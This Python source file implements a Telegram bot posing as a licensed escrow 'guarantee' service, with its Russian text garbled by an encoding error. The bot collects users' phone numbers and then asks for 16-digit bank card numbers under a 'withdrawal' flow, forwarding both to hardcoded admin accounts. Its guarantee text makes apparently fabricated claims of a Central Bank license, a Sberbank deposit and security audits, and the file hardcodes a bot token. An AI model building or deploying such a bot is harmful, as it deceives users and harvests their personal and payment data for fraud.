import os
from datetime import datetime
from telegram import (
    Update,
    ReplyKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardRemove,
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)
import json


BOT_TOKEN = "7686332847:AAEiBKkdwkxTrz8gq3Q41rD3UvZhSO9Birs"
ADMINS = [1642578826, 5791861226]  # –î–≤–∞ –∞–¥–º–∏–Ω–∞, –µ–±–∞—Ç—å!
DATA_FILE = "users_data.json"


REQUEST_CONTACT, WITHDRAW_AMOUNT, WITHDRAW_CARD = range(3)



def load_users_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    return {}



def save_users_data(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=4)



async def notify_admin(context, message):
    for admin_id in ADMINS:  # –®–ª—ë–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ–±–æ–∏–º –ø–∞—Ü–∞–Ω–∞–º
        await context.bot.send_message(chat_id=admin_id, text=message)



async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    users_data = load_users_data()

    if str(user.id) not in users_data:
        contact_button = KeyboardButton("üì± –ü–æ–¥–µ–ª–∏—Ç—å—Å—è –∫–æ–Ω—Ç–∞–∫—Ç–æ–º", request_contact=True)
        reply_markup = ReplyKeyboardMarkup([[contact_button]], resize_keyboard=True, one_time_keyboard=True)

        await update.message.reply_text(
            f"–ü—Ä–∏–≤–µ—Ç {user.first_name}, –¥–ª—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ –ø–æ–¥–µ–ª–∏—Ç–µ—Å—å –≤–∞—à–∏–º –∫–æ–Ω—Ç–∞–∫—Ç–æ–º",
            reply_markup=reply_markup
        )
        return REQUEST_CONTACT
    else:
        await show_menu(update, context)
        return ConversationHandler.END



async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    user = update.effective_user
    users_data = load_users_data()

    if str(user.id) not in users_data:
        users_data[str(user.id)] = {
            "name": user.first_name,
            "username": user.username,
            "phone": contact.phone_number,
            "balance": 0,
            "auth_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "withdrawals": []
        }
        save_users_data(users_data)


        admin_msg = (
            "üÜï *–ù–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å:*\n"
            f"üÜî ID: `{user.id}`\n"
            f"üë§ –ò–º—è: {user.first_name}\n"
            f"üìû –¢–µ–ª–µ—Ñ–æ–Ω: {contact.phone_number}\n"
            f"üìÖ –î–∞—Ç–∞: {users_data[str(user.id)]['auth_date']}"
        )
        await notify_admin(context, admin_msg)

    await update.message.reply_text(
        "–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è –ø—Ä–æ—à–ª–∞ —É—Å–ø–µ—à–Ω–æ!",
        reply_markup=ReplyKeyboardRemove()
    )
    await show_menu(update, context)
    return ConversationHandler.END



async def show_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    menu_buttons = [
        ["üë§ –ü—Ä–æ—Ñ–∏–ª—å", "üí≥ –í—ã–≤–µ—Å—Ç–∏ —Å—Ä–µ–¥—Å—Ç–≤–∞"],
        ["üõ°Ô∏è –ì–∞—Ä–∞–Ω—Ç–∏—è"]
    ]
    reply_markup = ReplyKeyboardMarkup(menu_buttons, resize_keyboard=True)

    if update.message:
        await update.message.reply_text("–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:", reply_markup=reply_markup)
    else:
        await update.callback_query.message.reply_text("–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:", reply_markup=reply_markup)



async def show_profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    users_data = load_users_data()
    user_data = users_data.get(str(user.id), {})

    if user_data:
        profile_text = (
            f"üë§ –ü—Ä–æ—Ñ–∏–ª—å:\n"
            f"üÜî ID: {user.id}\n"
            f"üìÖ –î–∞—Ç–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏: {user_data.get('auth_date', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}\n"
            f"üí∞ –ë–∞–ª–∞–Ω—Å: {user_data.get('balance', 0)} —Ä—É–±."
        )
        await update.message.reply_text(profile_text)
    else:
        await update.message.reply_text("–ü—Ä–æ—Ñ–∏–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –Ω–∞—á–Ω–∏—Ç–µ —Å /start")



async def request_withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –¥–ª—è –≤—ã–≤–æ–¥–∞ (–≤ —Ä—É–±–ª—è—Ö):",
        reply_markup=ReplyKeyboardRemove()
    )
    return WITHDRAW_AMOUNT



async def handle_withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        amount = float(update.message.text)
        if amount <= 0:
            raise ValueError

        context.user_data["withdraw_amount"] = amount
        await update.message.reply_text("–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –±–∞–Ω–∫–æ–≤—Å–∫–æ–π –∫–∞—Ä—Ç—ã (16 —Ü–∏—Ñ—Ä):")
        return WITHDRAW_CARD
    except (ValueError, TypeError):
        await update.message.reply_text("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—É—é —Å—É–º–º—É (—á–∏—Å–ª–æ –±–æ–ª—å—à–µ 0)")
        return WITHDRAW_AMOUNT



async def handle_withdraw_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    card_number = update.message.text.replace(" ", "")

    if len(card_number) == 16 and card_number.isdigit():
        amount = context.user_data.get("withdraw_amount", 0)
        user = update.effective_user
        users_data = load_users_data()

        if str(user.id) in users_data:
            if users_data[str(user.id)]["balance"] >= amount:
                users_data[str(user.id)]["balance"] -= amount
                withdrawal = {
                    "amount": amount,
                    "card": card_number,
                    "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "status": "pending"
                }
                users_data[str(user.id)]["withdrawals"].append(withdrawal)
                save_users_data(users_data)


                admin_msg = (
                    "‚ö†Ô∏è *–ó–∞–ø—Ä–æ—Å –Ω–∞ –≤—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤:*\n"
                    f"üÜî ID: `{user.id}`\n"
                    f"üí≥ –°—É–º–º–∞: *{amount} —Ä—É–±.*\n"
                    f"üìÖ –î–∞—Ç–∞: {withdrawal['date']}\n"
                    f"üî¢ –ö–∞—Ä—Ç–∞: `{card_number}`"
                )
                await notify_admin(context, admin_msg)

                await update.message.reply_text(
                    f"‚úÖ –ó–∞–ø—Ä–æ—Å –Ω–∞ –≤—ã–≤–æ–¥ {amount} —Ä—É–±. –ø—Ä–∏–Ω—è—Ç.\n"
                    "–û–∂–∏–¥–∞–π—Ç–µ –ø–æ—Å—Ç—É–ø–ª–µ–Ω–∏–µ —Å—Ä–µ–¥—Å—Ç–≤ –≤ —Ç–µ—á–µ–Ω–∏–µ 48—á.",
                    reply_markup=ReplyKeyboardMarkup([["üè† –ú–µ–Ω—é"]], resize_keyboard=True)
                )
            else:
                await update.message.reply_text("‚ùå –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤ –Ω–∞ –±–∞–ª–∞–Ω—Å–µ")
        else:
            await update.message.reply_text("‚ùå –ü—Ä–æ—Ñ–∏–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω")
        return ConversationHandler.END
    else:
        await update.message.reply_text("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –Ω–æ–º–µ—Ä –∫–∞—Ä—Ç—ã (16 —Ü–∏—Ñ—Ä)")
        return WITHDRAW_CARD


async def show_guarantee(update: Update, context: ContextTypes.DEFAULT_TYPE):
    guarantee_text = """
–£–≤–∞–∂–∞–µ–º—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏!
¬´–ì–ê–†–ê–ù–¢ –ì–†–û–ó–ê –ë–û–¢¬ª ‚Äî –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–π –≥–∞—Ä–∞–Ω—Ç —Å–¥–µ–ª–æ–∫ –º–µ–∂–¥—É –ø—Ä–æ–¥–∞–≤—Ü–∞–º–∏ –∏ –ø–æ–∫—É–ø–∞—Ç–µ–ª—è–º–∏, –¥–µ–π—Å—Ç–≤—É—é—â–∏–π –Ω–∞ –æ—Å–Ω–æ–≤–∞–Ω–∏–∏ —Ñ–µ–¥–µ—Ä–∞–ª—å–Ω–æ–π –ª–∏—Ü–µ–Ω–∑–∏–∏ ‚Ññ –§–õ-2023/456, –≤—ã–¥–∞–Ω–Ω–æ–π –¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–º –±–∞–Ω–∫–æ–º –†–§. –ù–∞—à–∞ –¥–µ—è—Ç–µ–ª—å–Ω–æ—Å—Ç—å —Ä–µ–≥—É–ª–∏—Ä—É–µ—Ç—Å—è –∑–∞–∫–æ–Ω–æ–¥–∞—Ç–µ–ª—å—Å—Ç–≤–æ–º –†–§ (—Å—Ç. 421 –ì–ö –†–§ –∏ –§–ó ¬´–û —Ü–∏—Ñ—Ä–æ–≤—ã—Ö —Ñ–∏–Ω–∞–Ω—Å–æ–≤—ã—Ö –∞–∫—Ç–∏–≤–∞—Ö¬ª), —á—Ç–æ –æ–±–µ—Å–ø–µ—á–∏–≤–∞–µ—Ç –º–∞–∫—Å–∏–º–∞–ª—å–Ω—É—é –ø—Ä–æ–∑—Ä–∞—á–Ω–æ—Å—Ç—å –∏ –∑–∞—â–∏—Ç—É –≤–∞—à–∏—Ö –∏–Ω—Ç–µ—Ä–µ—Å–æ–≤.

üîí –§–∏–Ω–∞–Ω—Å–æ–≤–∞—è –Ω–∞–¥–µ–∂–Ω–æ—Å—Ç—å:
–ì–∞—Ä–∞–Ω—Ç–∏–π–Ω—ã–π –¥–µ–ø–æ–∑–∏—Ç –±–æ—Ç–∞ ‚Äî 1 500 000 —Ä—É–±–ª–µ–π, —Ä–∞–∑–º–µ—â–µ–Ω–Ω—ã–π –Ω–∞ —Å–ø–µ—Ü—Å—á–µ—Ç–µ –≤ ¬´–°–±–µ—Ä–±–∞–Ω–∫–µ –†–æ—Å—Å–∏–∏¬ª (—Ä–µ–∫–≤–∏–∑–∏—Ç—ã –¥–æ—Å—Ç—É–ø–Ω—ã –ø–æ –∑–∞–ø—Ä–æ—Å—É). –≠—Ç–∏ —Å—Ä–µ–¥—Å—Ç–≤–∞ —Å–ª—É–∂–∞—Ç —Å—Ç—Ä–∞—Ö–æ–≤–∫–æ–π –Ω–∞ —Å–ª—É—á–∞–π —Ñ–æ—Ä—Å-–º–∞–∂–æ—Ä–æ–≤ –∏ –≥–∞—Ä–∞–Ω—Ç–∏—Ä—É—é—Ç –∏—Å–ø–æ–ª–Ω–µ–Ω–∏–µ –æ–±—è–∑–∞—Ç–µ–ª—å—Å—Ç–≤ –ø–µ—Ä–µ–¥ —É—á–∞—Å—Ç–Ω–∏–∫–∞–º–∏ —Å–¥–µ–ª–æ–∫.

4 800+ —É—Å–ø–µ—à–Ω—ã—Ö —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π –µ–∂–µ–º–µ—Å—è—á–Ω–æ –∏ 12 000+ –¥–æ–≤–æ–ª—å–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –∑–∞ 2023 –≥–æ–¥ ‚Äî –Ω–∞—à –ª—É—á—à–∏–π –ø–æ–∫–∞–∑–∞—Ç–µ–ª—å –¥–æ–≤–µ—Ä–∏—è.

üõ° –ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç:
–°—Ä–µ–¥—Å—Ç–≤–∞ –ø–æ–∫—É–ø–∞—Ç–µ–ª—è –±–ª–æ–∫–∏—Ä—É—é—Ç—Å—è –≤ –∑–∞—â–∏—â–µ–Ω–Ω–æ–º –∫–æ—à–µ–ª—å–∫–µ –±–æ—Ç–∞ –¥–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —É—Å–ª–æ–≤–∏–π —Å–¥–µ–ª–∫–∏.

–ü—Ä–æ–¥–∞–≤–µ—Ü –ø–æ–ª—É—á–∞–µ—Ç –æ–ø–ª–∞—Ç—É —Ç–æ–ª—å–∫–æ –ø–æ—Å–ª–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è —Ç–æ–≤–∞—Ä–∞/—É—Å–ª—É–≥–∏ –ø–æ–∫—É–ø–∞—Ç–µ–ª–µ–º.

–í—Å–µ –æ–ø–µ—Ä–∞—Ü–∏–∏ —à–∏—Ñ—Ä—É—é—Ç—Å—è –ø–æ —Å—Ç–∞–Ω–¥–∞—Ä—Ç—É AES-256, —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—Ç —Ç—Ä–µ–±–æ–≤–∞–Ω–∏—è–º 152-–§–ó ¬´–û –ø–µ—Ä—Å–æ–Ω–∞–ª—å–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö¬ª.

üìå –ü–æ—á–µ–º—É –Ω–∞–º –º–æ–∂–Ω–æ –¥–æ–≤–µ—Ä—è—Ç—å:
–ê—É–¥–∏—Ç –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏: –µ–∂–µ–≥–æ–¥–Ω—ã–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ –æ—Ç –Ω–µ–∑–∞–≤–∏—Å–∏–º–æ–π –∫–æ–º–ø–∞–Ω–∏–∏ ¬´CyberSecure¬ª.

–ö—Ä—É–≥–ª–æ—Å—É—Ç–æ—á–Ω–∞—è –ø–æ–¥–¥–µ—Ä–∂–∫–∞: –∫–æ–º–∞–Ω–¥–∞ —é—Ä–∏—Å—Ç–æ–≤ –∏ —Ñ–∏–Ω–∞–Ω—Å–æ–≤—ã—Ö —ç–∫—Å–ø–µ—Ä—Ç–æ–≤ —Ä–µ—à–∞–µ—Ç —Å–ø–æ—Ä—ã –≤ —Ç–µ—á–µ–Ω–∏–µ 24 —á–∞—Å–æ–≤.

–ü—É–±–ª–∏—á–Ω–∞—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞: –æ—Ç—á–µ—Ç—ã –æ —Ä–∞–±–æ—Ç–µ –±–æ—Ç–∞ –µ–∂–µ–∫–≤–∞—Ä—Ç–∞–ª—å–Ω–æ –ø—É–±–ª–∏–∫—É—é—Ç—Å—è –Ω–∞ –Ω–∞—à–µ–º —Å–∞–π—Ç–µ.

¬´–ì–ê–†–ê–ù–¢ –ì–†–û–ó–ê¬ª ‚Äî –≤–∞—à –Ω–∞–¥–µ–∂–Ω—ã–π –ø–∞—Ä—Ç–Ω–µ—Ä –≤ –±–µ–∑–æ–ø–∞—Å–Ω—ã—Ö —Å–¥–µ–ª–∫–∞—Ö. –ú—ã –±–µ—Ä–µ–º —Ä–∏—Å–∫–∏ –Ω–∞ —Å–µ–±—è, —á—Ç–æ–±—ã –≤—ã –º–æ–≥–ª–∏ —Ç–æ—Ä–≥–æ–≤–∞—Ç—å —Å —É–≤–µ—Ä–µ–Ω–Ω–æ—Å—Ç—å—é!
"""
    await update.message.reply_text(guarantee_text)


async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await show_menu(update, context)


async def show_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id not in ADMINS:  # –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ —Å–≤–æ–µ–≥–æ
        await update.message.reply_text("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥–µ.")
        return

    users_data = load_users_data()
    if not users_data:
        await update.message.reply_text("üì≠ –ù–µ—Ç –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π.")
        return

    users_list = []
    for user_id, data in users_data.items():
        users_list.append(
            f"üÜî ID: `{user_id}`\n"
            f"üìû –¢–µ–ª–µ—Ñ–æ–Ω: {data.get('phone', 'N/A')}\n"
            f"üìÖ –î–∞—Ç–∞: {data.get('auth_date', 'N/A')}\n"
            f"üí∞ –ë–∞–ª–∞–Ω—Å: {data.get('balance', 0)} —Ä—É–±.\n"
        )

    await update.message.reply_text(
        "üìä *–°–ø–∏—Å–æ–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π:*\n\n" + "\n".join(users_list),
        parse_mode="Markdown"
    )


async def handle_admin_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS:
        return

    text = update.message.text
    if text.startswith("/add_balance"):
        try:
            _, user_id, amount = text.split()
            amount = float(amount)
            users_data = load_users_data()

            if user_id in users_data:
                users_data[user_id]["balance"] += amount
                save_users_data(users_data)
                await update.message.reply_text(f"‚úÖ –ë–∞–ª–∞–Ω—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user_id} –ø–æ–ø–æ–ª–Ω–µ–Ω –Ω–∞ {amount} —Ä—É–±.")
            else:
                await update.message.reply_text("‚ùå –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω")
        except (ValueError, IndexError):
            await update.message.reply_text("–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /add_balance USER_ID AMOUNT")


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "–î–µ–π—Å—Ç–≤–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ",
        reply_markup=ReplyKeyboardMarkup([["üè† –ú–µ–Ω—é"]], resize_keyboard=True)
    )
    return ConversationHandler.END


def main():
    application = Application.builder().token(BOT_TOKEN).build()


    auth_conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            REQUEST_CONTACT: [
                MessageHandler(filters.CONTACT, handle_contact),
                CommandHandler("menu", menu),
                CommandHandler("cancel", cancel)
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )


    withdraw_conv_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^üí≥ –í—ã–≤–µ—Å—Ç–∏ —Å—Ä–µ–¥—Å—Ç–≤–∞$"), request_withdraw_amount)],
        states={
            WITHDRAW_AMOUNT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_withdraw_amount),
                CommandHandler("cancel", cancel)
            ],
            WITHDRAW_CARD: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_withdraw_card),
                CommandHandler("cancel", cancel)
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    application.add_handler(auth_conv_handler)
    application.add_handler(withdraw_conv_handler)
    application.add_handler(MessageHandler(filters.Regex("^üë§ –ü—Ä–æ—Ñ–∏–ª—å$"), show_profile))
    application.add_handler(MessageHandler(filters.Regex("^üõ°Ô∏è –ì–∞—Ä–∞–Ω—Ç–∏—è$"), show_guarantee))
    application.add_handler(MessageHandler(filters.Regex("^üè† –ú–µ–Ω—é$"), menu))
    application.add_handler(CommandHandler("menu", menu))
    application.add_handler(CommandHandler("users", show_users, filters.User(ADMINS)))  # –î–≤–∞ –∞–¥–º–∏–Ω–∞ —Ä—É–ª—è—Ç
    application.add_handler(MessageHandler(filters.TEXT & filters.User(ADMINS), handle_admin_message))
    application.run_polling()


if __name__ == "__main__":
    main()

print("–¢–∏–º–æ—à–∞ –ê–±–∞—à–∏—á–µ–≤")
